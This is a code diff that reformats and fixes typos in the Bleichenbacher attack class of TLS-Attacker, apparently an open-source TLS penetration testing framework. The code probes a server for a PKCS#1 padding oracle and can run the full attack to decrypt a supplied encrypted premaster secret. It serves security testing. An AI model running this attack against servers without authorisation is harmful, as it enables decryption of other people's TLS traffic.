@@ -1,13 +1,15 @@
 /**
  * TLS-Attacker - A Modular Penetration Testing Framework for TLS
  *
- * Copyright 2014-2020 Ruhr University Bochum, Paderborn University,
- * and Hackmanit GmbH
+ * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
  *
- * Licensed under Apache License 2.0
- * http://www.apache.org/licenses/LICENSE-2.0
+ * Licensed under Apache License, Version 2.0
+ * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
+
 package de.rub.nds.tlsattacker.attacks.impl;
+
+import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
@@ -34,7 +36,6 @@ import de.rub.nds.tlsattacker.core.state.State;
 import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
 import de.rub.nds.tlsattacker.core.workflow.ParallelExecutor;
 import de.rub.nds.tlsattacker.core.workflow.task.TlsTask;
-import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
 import java.util.LinkedList;
@@ -44,9 +45,8 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 /**
- * Sends differently formatted PKCS#1 messages to the TLS server and observes
- * the server responses. In case there are differences in the server responses,
- * it is very likely that it is possible to execute Bleichenbacher attacks.
+ * Sends differently formatted PKCS#1 messages to the TLS server and observes the server responses. In case there are
+ * differences in the server responses, it is very likely that it is possible to execute Bleichenbacher attacks.
  */
 public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {
 
@@ -71,7 +71,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     private final ParallelExecutor executor;
 
     private boolean shakyScans = false;
-    private boolean errornousScans = false;
+    private boolean erroneousScans = false;
 
     /**
      *
@@ -91,15 +91,20 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
      * @param executor
      */
     public BleichenbacherAttacker(BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig,
-            ParallelExecutor executor) {
+        ParallelExecutor executor) {
         super(bleichenbacherConfig, baseConfig);
         tlsConfig = getTlsConfig();
         this.executor = executor;
     }
 
+    /**
+     *
+     * @return
+     */
     @Override
     public Boolean isVulnerable() {
-        CONSOLE.info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
+        CONSOLE
+            .info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
         CONSOLE.info("A server is considered secure if it always responds the same way.");
         EqualityError referenceError = null;
         fullResponseMap = new LinkedList<>();
@@ -108,15 +113,16 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 List<VectorResponse> responseMap = createVectorResponseList();
                 this.fullResponseMap.addAll(responseMap);
             }
-        } catch (AttackFailedException E) {
-            CONSOLE.info(E.getMessage());
+        } catch (AttackFailedException e) {
+            CONSOLE.info(e.getMessage());
             return null;
         }
         referenceError = getEqualityError(fullResponseMap);
         if (referenceError != EqualityError.NONE) {
             CONSOLE.info("Found a behavior difference within the responses. The server could be vulnerable.");
         } else {
-            CONSOLE.info("Found no behavior difference within the responses. The server is very liekly not vulnerable.");
+            CONSOLE
+                .info("Found no behavior difference within the responses. The server is very likely not vulnerable.");
         }
 
         CONSOLE.info(EqualityErrorTranslator.translation(referenceError, null, null));
@@ -131,16 +137,20 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         return referenceError != EqualityError.NONE;
     }
 
+    /**
+     *
+     * @return
+     */
     public List<VectorResponse> createVectorResponseList() {
         RSAPublicKey publicKey = getServerPublicKey();
         List<TlsTask> taskList = new LinkedList<>();
         List<FingerprintTaskVectorPair> stateVectorPairList = new LinkedList<>();
         for (Pkcs1Vector vector : Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType(),
-                tlsConfig.getDefaultHighestClientProtocolVersion())) {
+            tlsConfig.getDefaultHighestClientProtocolVersion())) {
             State state = new State(tlsConfig, BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig,
-                    config.getWorkflowType(), vector.getEncryptedValue()));
+                config.getWorkflowType(), vector.getEncryptedValue()));
             FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
-                    executor.getReexecutions(), additionalTcpTimeout);
+                executor.getReexecutions(), additionalTcpTimeout);
             taskList.add(fingerPrintTask);
             stateVectorPairList.add(new FingerprintTaskVectorPair(fingerPrintTask, vector));
         }
@@ -149,7 +159,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         for (FingerprintTaskVectorPair pair : stateVectorPairList) {
             ResponseFingerprint fingerprint = null;
             if (pair.getFingerPrintTask().isHasError()) {
-                errornousScans = true;
+                erroneousScans = true;
                 LOGGER.warn("Could not extract fingerprint for " + pair.toString());
             } else {
                 testedSuite = pair.getFingerPrintTask().getState().getTlsContext().getSelectedCipherSuite();
@@ -162,17 +172,14 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 tempResponseVectorList.add(new VectorResponse(pair.getVector(), fingerprint));
             }
         }
-        // Check that the public key send by the server is actually the public
-        // key used to generate
-        // the vectors. This is currently a limitation of our script as the
-        // attack vectors are
-        // generated statically and not dynamically. We will adjust this in
-        // future versions.
+        // Check that the public key send by the server is actually the public key used to generate the vectors. This is
+        // currently a limitation of our script as the attack vectors are generated statically and not dynamically. We
+        // will adjust this in future versions.
         for (FingerprintTaskVectorPair pair : stateVectorPairList) {
-            if (pair.getFingerPrintTask().getState().getTlsContext().getServerRsaModulus() != null
-                    && !pair.getFingerPrintTask().getState().getTlsContext().getServerRsaModulus()
-                            .equals(publicKey.getModulus())) {
-                throw new OracleUnstableException("Server sent us a different publickey during the scan. Aborting test");
+            if (pair.getFingerPrintTask().getState().getTlsContext().getServerRsaModulus() != null && !pair
+                .getFingerPrintTask().getState().getTlsContext().getServerRsaModulus().equals(publicKey.getModulus())) {
+                throw new OracleUnstableException(
+                    "Server sent us a different publickey during the scan. Aborting test");
             }
         }
         return tempResponseVectorList;
@@ -181,7 +188,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     /**
      * This assumes that the responseVectorList only contains comparable vectors
      *
-     * @param responseVectorList
+     * @param  responseVectorList
      * @return
      */
     public EqualityError getEqualityError(List<VectorResponse> responseVectorList) {
@@ -191,8 +198,8 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 if (responseOne == responseTwo) {
                     continue;
                 }
-                EqualityError error = FingerPrintChecker.checkEquality(responseOne.getFingerprint(),
-                        responseTwo.getFingerprint());
+                EqualityError error =
+                    FingerPrintChecker.checkEquality(responseOne.getFingerprint(), responseTwo.getFingerprint());
                 if (error != EqualityError.NONE) {
                     CONSOLE.info("Found an EqualityError: " + error);
                     LOGGER.debug("Fingerprint1: " + responseOne.getFingerprint().toString());
@@ -225,22 +232,24 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         }
         RSAPublicKey publicKey = getServerPublicKey();
         if (publicKey == null) {
+            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
             return;
         }
 
         if (config.getEncryptedPremasterSecret() == null) {
-            throw new ConfigurationException("You have to set the encrypted premaster secret you are "
-                    + "going to decrypt");
+            throw new ConfigurationException(
+                "You have to set the encrypted premaster secret you are " + "going to decrypt");
         }
 
+        LOGGER.info("Fetched the following server public key: " + publicKey);
         byte[] pms = ArrayConverter.hexStringToByteArray(config.getEncryptedPremasterSecret());
         if ((pms.length * Bits.IN_A_BYTE) != publicKey.getModulus().bitLength()) {
             throw new ConfigurationException("The length of the encrypted premaster secret you have "
-                    + "is not equal to the server public key length. Have you selected the correct value?");
+                + "is not equal to the server public key length. Have you selected the correct value?");
         }
-        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, tlsConfig,
-                extractValidFingerprint(publicKey, tlsConfig.getDefaultHighestClientProtocolVersion()), null,
-                config.getWorkflowType());
+        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, getTlsConfig(),
+            extractValidFingerprint(publicKey, tlsConfig.getDefaultHighestClientProtocolVersion()), null,
+            config.getWorkflowType());
         Bleichenbacher attacker = new Bleichenbacher(pms, oracle, config.isMsgPkcsConform());
         attacker.attack();
         BigInteger solution = attacker.getSolution();
@@ -250,9 +259,9 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey, ProtocolVersion version) {
         Pkcs1Vector vector = Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, version);
         State state = new State(tlsConfig, BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig,
-                config.getWorkflowType(), vector.getEncryptedValue()));
+            config.getWorkflowType(), vector.getEncryptedValue()));
         FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
-                executor.getReexecutions(), additionalTcpTimeout);
+            executor.getReexecutions(), additionalTcpTimeout);
         FingerprintTaskVectorPair stateVectorPair = new FingerprintTaskVectorPair(fingerPrintTask, vector);
         executor.bulkExecuteTasks(fingerPrintTask);
         ResponseFingerprint fingerprint = null;
@@ -260,8 +269,8 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             LOGGER.warn("Could not extract fingerprint for " + stateVectorPair.toString());
         } else {
             testedSuite = stateVectorPair.getFingerPrintTask().getState().getTlsContext().getSelectedCipherSuite();
-            testedVersion = stateVectorPair.getFingerPrintTask().getState().getTlsContext()
-                    .getSelectedProtocolVersion();
+            testedVersion =
+                stateVectorPair.getFingerPrintTask().getState().getTlsContext().getSelectedProtocolVersion();
             if (testedSuite == null || testedVersion == null) {
                 LOGGER.fatal("Could not find ServerHello after successful extraction");
                 throw new OracleUnstableException("Fatal Extraction error");
@@ -292,7 +301,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     }
 
     public boolean isErrornousScans() {
-        return errornousScans;
+        return erroneousScans;
     }
 
     public boolean isIncreasingTimeout() {
